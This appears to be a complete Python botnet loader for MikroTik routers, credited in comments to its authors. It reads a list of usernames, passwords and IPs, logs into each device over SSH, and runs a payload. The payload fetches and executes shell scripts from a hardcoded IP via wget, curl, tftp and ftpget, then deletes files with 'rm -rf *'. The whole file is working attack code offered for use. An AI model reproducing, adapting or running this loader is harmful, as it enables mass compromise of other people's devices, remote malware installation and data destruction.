#!/usr/bin/python
#Mikrotik loader made by slumpthegod @telnut
#Corrections made by @babyyrex 
#creds to babyyrex for the payload detection
#closed port fix by slump
#made simply for kowai

import sys, re, os, paramiko, socket
from threading import Thread
from time import sleep
from Queue import *

queue = Queue()
queue_count = 0

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")
ip = "138.68.21.206"
payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.68.21.206/8UsA.sh; curl -O http://138.68.21.206/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 138.68.21.206 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 138.68.21.206; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 138.68.21.206 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *"
print "\033[35m"

lines = open(sys.argv[1],"r").readlines()
paramiko.util.log_to_file("/dev/null")

def send_payload(username,password,ip): #simple layout u can change if u want 
    try:
        port = 22
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port = port, username=username, password=password, timeout=3)
        ssh.exec_command(payload)
        print "\x1b[1;37m Mikrotik Attempt \x1b[1;33m-- \x1b[1;35m" + ip + "\033[37m"
        sleep(15)
        ssh.close()
    except:
        pass

def check(login):
    if login.startswith("DUP"): #Making sure dups dont join
        return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((login.split(":")[2], 22))
        s.close()
        send_payload(login.split(":")[0], login.split(":")[1], login.split(":")[2])
    except:
        pass
		
def load_queue(to_open):
    global queue_count
    for line in open(str(to_open), "r").readlines():
        line = line.strip("\r\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")

def main():
    if len(sys.argv) < 2:
        sys.exit("%s [list]" % (sys.argv[0]))
    i = 0
    load_queue(sys.argv[1])
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=check, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            sys.exit("Interrupted? (ctrl + c)")
    thread.join()
    return

if __name__ == "__main__":
    main()
	
